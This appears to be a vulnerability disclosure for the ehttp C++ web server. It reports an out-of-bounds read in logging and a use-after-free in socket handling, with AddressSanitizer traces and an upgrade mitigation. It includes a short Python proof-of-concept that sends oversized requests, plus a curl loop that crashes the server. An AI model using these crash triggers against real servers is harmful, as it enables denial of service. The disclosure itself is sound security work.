# Overview

When executing some fuzz tests I discovered a few bugs in ehttp at the following locations:

* Out-of-bounds-read in void _log at simple_log.cpp:221
* Use-after-free in read_func(void*) at epoll_socket.cpp:234

## Out-of-bounds-read in void _log at simple_log.cpp:221 when sending a malformed HTTP method, large url, or large HTTP header value to the server 

```
 void _log(const char *format, va_list ap) { 
 	if (!use_file_appender) { // if no config, send log to stdout 
 		vprintf(format, ap); 
 		printf("\n"); 
 		return; 
```

Below are a few examples:

*Malformed HTTP Method*
```
GETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGET /
```

*Malformed URL*
```
GET /hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello
```

I compiled and executed the examples from the instructions with address sanitizer to help debug the exact location of the out-of-bounds-read:

#### Makefile modifications
```
CXXFLAGS += -g -Wall -fsanitize=address
LDFLAGS += -pthread -fsanitize=address
```

#### Compilation
```
 make && make test && ./output/test/hello_server 8080
```

### Below is a proof of concept script named 'poc.py' to reproduce the issue:

```
#!/usr/bin/env python3

import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("localhost", 8080))
sock.send(b"GET"*5000+b" /hello"*5000+b" HTTP/1.1\r\nHost:localhost:8080\r\n\r\n")
response = sock.recv(4096)
sock.close()
```


### Executing the Python3 script

```
$ python3 poc.py
```

#### Address Sanitizer  Output
```
==2308883==ERROR: AddressSanitizer: dynamic-stack-buffer-overflow on address 0x7fdc638f3ce0 at pc 0x7fdc6889109c bp 0x7fdc638f2040 sp 0x7fdc638f1800
READ of size 4097 at 0x7fdc638f3ce0 thread T3                              
    #0 0x7fdc6889109b in printf_common ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors_format.inc:553                                              
    #1 0x7fdc6889189a in __interceptor_vprintf ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1738                                            
    #2 0x559614bebecd in _log(char const*, __va_list_tag*) src/simple_log.cpp:221                                                                                              
    #3 0x559614bec870 in log_debug(char const*, ...) src/simple_log.cpp:290
    #4 0x559614bdf2a1 in Request::parse_request(char const*, int) src/sim_parser.cpp:580
    #5 0x559614bc75bc in HttpEpollWatcher::on_readable(int&, epoll_event&) src/http_server.cpp:296
    #6 0x559614bf59c0 in EpollSocket::handle_readable_event(epoll_event&) src/epoll_socket.cpp:247
    #7 0x559614bf5703 in read_func(void*) src/epoll_socket.cpp:230
    #8 0x559614beddd9 in Task::run() src/threadpool.cpp:19                    
    #9 0x559614beefa7 in ThreadPool::execute_thread() src/threadpool.cpp:159
    #10 0x559614bee10c in ss_start_thread src/threadpool.cpp:48                     
    #11 0x7fdc682a63eb in start_thread nptl/pthread_create.c:444                                                                                                               
    #12 0x7fdc68326a1b in clone3 ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81
                                                                                       
Address 0x7fdc638f3ce0 is located in stack of thread T3                             
SUMMARY: AddressSanitizer: dynamic-stack-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors_format.inc:553 in printf_common
Shadow bytes around the buggy address:                                                 
  0x7fdc638f3a00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7fdc638f3a80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7fdc638f3b00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7fdc638f3b80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7fdc638f3c00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x7fdc638f3c80: 00 00 00 00 00 00 00 00 00 00 00 00[cb]cb cb cb
  0x7fdc638f3d00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7fdc638f3d80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7fdc638f3e00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7fdc638f3e80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7fdc638f3f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
Thread T3 created by T1 here:
    #0 0x7fdc68847c36 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:208
    #1 0x559614bee436 in ThreadPool::start_threadpool() src/threadpool.cpp:70
    #2 0x559614bf74ba in EpollSocket::init_tp() src/epoll_socket.cpp:417
    #3 0x559614bf87b4 in EpollSocket::start_epoll() src/epoll_socket.cpp:514
    #4 0x559614bc539e in HttpServer::start_sync() src/http_server.cpp:132
    #5 0x559614bc5067 in http_start_routine(void*) src/http_server.cpp:102
    #6 0x7fdc682a63eb in start_thread nptl/pthread_create.c:444

Thread T1 created by T0 here:
    #0 0x7fdc68847c36 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:208
    #1 0x559614bc50a1 in HttpServer::start_async() src/http_server.cpp:107
    #2 0x559614bc0d99 in main test/hello_server.cpp:112
    #3 0x7fdc682456c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58

==2308883==ABORTING
```

#### Mitigation

Update ehttp to at least commit 716ff7a.


---


## Heap use-after-free in read_func(void*) at epoll_socket.cpp:234

```
 void read_func(void *data) { 
     TaskData *td = (TaskData *) data; 
     td->es->handle_readable_event(td->event); 
  
     EpollContext *hc = (EpollContext *) td->event.data.ptr; 
     if (hc != NULL) { 
         hc->_ctx_status = CONTEXT_READ_OVER; 
     } 
     delete td; 
 } 
```

Similar to above, I compiled and executed the examples from the instructions with address sanitizer to help debug the exact location of the use-after-free bug:

#### Makefile modifications
```
CXXFLAGS += -g -Wall -fsanitize=address
LDFLAGS += -pthread -fsanitize=address
```

#### Compilation
```
 make && make test && ./output/test/issue5_server 1234
```

### Sending multiple consecutive connections to the server results in a use-after-free bug

**After running the script below, wait around ~30-60 seconds and the server will crash.**


```
$ while true; do curl http://localhost:1234/; done 
```




https://github.com/Halcy0nic/Trophies/assets/42481692/ef1cab24-0188-418e-94ef-230dcda559f9





#### Address Sanitizer Output

```

==131898==ERROR: AddressSanitizer: heap-use-after-free on address 0x607001a34440 at pc 0x55999cd1a37f bp 0x7f44178fddd0 sp 0x7f44178fddc8                                      
WRITE of size 4 at 0x607001a34440 thread T2                                                                                                                                    
    #0 0x55999cd1a37e in read_func(void*) src/epoll_socket.cpp:234                     
    #1 0x55999cd25201 in Task::run() src/threadpool.cpp:19               
    #2 0x55999cd263cf in ThreadPool::execute_thread() src/threadpool.cpp:159
    #3 0x55999cd25534 in ss_start_thread src/threadpool.cpp:48                                                                                                                 
    #4 0x7f441b0a63eb in start_thread nptl/pthread_create.c:444                        
    #5 0x7f441b126a1b in clone3 ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81          
                                                                                                                                                                               
0x607001a34440 is located 64 bytes inside of 72-byte region [0x607001a34400,0x607001a34448)                                                                                    
freed by thread T3 here:                                                               
    #0 0x7f441b6da008 in operator delete(void*, unsigned long) ../../../../src/libsanitizer/asan/asan_new_delete.cpp:164                                                       
    #1 0x55999cd1dd7c in EpollSocket::close_and_release(epoll_event&) src/epoll_socket.cpp:571                                                                                 
    #2 0x55999cd1aa19 in EpollSocket::handle_writeable_event(int&, epoll_event&, EpollSocketWatcher&) src/epoll_socket.cpp:275                                                 
    #3 0x55999cd189d2 in write_func(void*) src/epoll_socket.cpp:74                                                                                                             
    #4 0x55999cd25201 in Task::run() src/threadpool.cpp:19                             
    #5 0x55999cd263cf in ThreadPool::execute_thread() src/threadpool.cpp:159           
    #6 0x55999cd25534 in ss_start_thread src/threadpool.cpp:48                                                                                                                 
    #7 0x7f441b0a63eb in start_thread nptl/pthread_create.c:444                        
                                                                                       
previously allocated by thread T0 here:                                                
    #0 0x7f441b6d9108 in operator new(unsigned long) ../../../../src/libsanitizer/asan/asan_new_delete.cpp:95                                                                  
    #1 0x55999cd19c6b in EpollSocket::create_client(int, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&) src/epoll_socket.cpp:191      
    #2 0x55999cd19eed in EpollSocket::handle_accept_event(int&, epoll_event&, EpollSocketWatcher&) src/epoll_socket.cpp:209                                                    
    #3 0x55999cd1bc20 in EpollSocket::handle_event(epoll_event&) src/epoll_socket.cpp:386                                                                                      
    #4 0x55999cd1d0cc in EpollSocket::start_event_loop() src/epoll_socket.cpp:491                                                                                              
    #5 0x55999cd1d5c7 in EpollSocket::start_epoll() src/epoll_socket.cpp:526           
    #6 0x55999ccef9fe in HttpServer::start_sync() src/http_server.cpp:132              
    #7 0x55999cceb270 in main test/issue5/issue5_server.cpp:78                         
    #8 0x7f441b0456c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58                                                                                      
                                                                                       
Thread T2 created by T0 here:                                                          
    #0 0x7f441b647c36 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:208                                                              
    #1 0x55999cd2585e in ThreadPool::start_threadpool() src/threadpool.cpp:70          
    #2 0x55999cd1c080 in EpollSocket::init_tp() src/epoll_socket.cpp:417               
    #3 0x55999cd1d37a in EpollSocket::start_epoll() src/epoll_socket.cpp:514
    #4 0x55999ccef9fe in HttpServer::start_sync() src/http_server.cpp:132 
    #5 0x55999cceb270 in main test/issue5/issue5_server.cpp:78                                                                                                                 
    #6 0x7f441b0456c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58                                                                                      
                                                                                                                                                                               
SUMMARY: AddressSanitizer: heap-use-after-free src/epoll_socket.cpp:234 in read_func(void*)                                                                                    
Shadow bytes around the buggy address:                                                 
  0x607001a34180: fd fd fd fd fd fa fa fa fa fa fd fd fd fd fd fd        
  0x607001a34200: fd fd fd fa fa fa fa fa fd fd fd fd fd fd fd fd           
  0x607001a34280: fd fa fa fa fa fa fd fd fd fd fd fd fd fd fd fa                                                                                                              
  0x607001a34300: fa fa fa fa fd fd fd fd fd fd fd fd fd fa fa fa                      
  0x607001a34380: fa fa fd fd fd fd fd fd fd fd fd fa fa fa fa fa                      
=>0x607001a34400: fd fd fd fd fd fd fd fd[fd]fa fa fa fa fa fd fd                                                                                                              
  0x607001a34480: fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd                                                                                                              
  0x607001a34500: fd fd fd fd fd fa fa fa fa fa fd fd fd fd fd fd                      
  0x607001a34580: fd fd fd fa fa fa fa fa fd fd fd fd fd fd fd fd                                                                                                              
  0x607001a34600: fd fa fa fa fa fa fd fd fd fd fd fd fd fd fd fa                                                                                                              
  0x607001a34680: fa fa fa fa fd fd fd fd fd fd fd fd fd fa fa fa                                                                                                              
Shadow byte legend (one shadow byte represents 8 application bytes):                                                                                                           
  Addressable:           00                                                            
  Partially addressable: 01 02 03 04 05 06 07                                          
  Heap left redzone:       fa                                                                                                                                                  
  Freed heap region:       fd                                                          
  Stack left redzone:      f1                                                          
  Stack mid redzone:       f2                                                          
  Stack right redzone:     f3                                                                                                                                                  
  Stack after return:      f5                                                                                                                                                  
  Stack use after scope:   f8                                                                                                                                                  
  Global redzone:          f9                                                                                                                                                  
  Global init order:       f6                                                                                                                                                  
  Poisoned by user:        f7                                                          
  Container overflow:      fc                                                          
  Array cookie:            ac                                                          
  Intra object redzone:    bb                                                                                                                                                  
  ASan internal:           fe                                                          
  Left alloca redzone:     ca                                                          
  Right alloca redzone:    cb                                                                                                                                                  
==131898==ABORTING                                
```

#### Mitigation

Update ehttp to at least commit 716ff7a.

--- 

## References

* https://cwe.mitre.org/data/definitions/416.html
* https://cwe.mitre.org/data/definitions/125.html
* https://github.com/hongliuliao/ehttp/commit/17405b975948abc216f6a085d2d027ec1cfd5766
* https://github.com/hongliuliao/ehttp/issues/38
